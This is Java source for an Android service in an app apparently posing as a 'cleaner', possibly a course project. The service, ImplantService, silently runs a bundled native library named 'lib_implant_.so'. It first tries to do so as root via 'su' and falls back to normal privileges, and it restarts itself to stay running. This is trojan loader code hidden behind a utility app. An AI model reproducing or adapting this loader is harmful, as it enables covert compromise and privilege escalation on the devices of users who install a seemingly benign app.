package sx.root.cs4001.androidcleanerpro;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.support.annotation.Nullable;

public class ImplantService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        PackageManager m = getPackageManager();
        String s = getPackageName();

        try {
            PackageInfo p = m.getPackageInfo(s, 0);
            s = p.applicationInfo.dataDir;
        } catch (PackageManager.NameNotFoundException e) {}

        String implant = s + "/lib/lib_implant_.so " + s;

        try { // try elevated prompt
            Process process = Runtime.getRuntime().exec("su -c \"" + implant + "\"");
        } catch (java.io.IOException e) {
            try { // fall back on normal prompt
                Process process = Runtime.getRuntime().exec(implant);
            } catch (java.io.IOException e2) {}
        }

        return START_STICKY;
    }
}